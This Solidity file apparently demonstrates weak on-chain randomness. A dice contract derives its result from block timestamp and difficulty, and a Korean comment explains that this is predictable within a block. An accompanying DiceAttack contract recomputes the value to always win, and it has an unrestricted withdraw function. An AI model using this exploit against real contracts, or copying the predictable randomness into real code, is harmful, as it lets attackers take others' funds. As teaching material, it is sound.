//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

contract dice{
    constructor() payable{}
    receive() external payable{}

    address private winner;

    function roll(uint8 dice_number) public payable{
        uint8 dice_ = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty)))%251);
        //온체인 상에서 아무리 랜덤값을 만들고자 해도, 블록 정보, difficulty는 같은 블록내에서 같은 정보를 받기 때문에 정답값을 유출 할 수 가 있음.

        if(dice_number == dice_){
            winner = msg.sender;
        }
    }

    function getWinner() public view returns(address){
        return winner;
    }

}

interface IDice{
    function roll(uint8) external;

}

contract DiceAttack{
    function attack(address _address) public payable{
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty)))%251);
        IDice(_address).roll(answer);
    }

    function withdraw(address payable _to) public{
        _to.transfer(address(this).balance);
    }

}
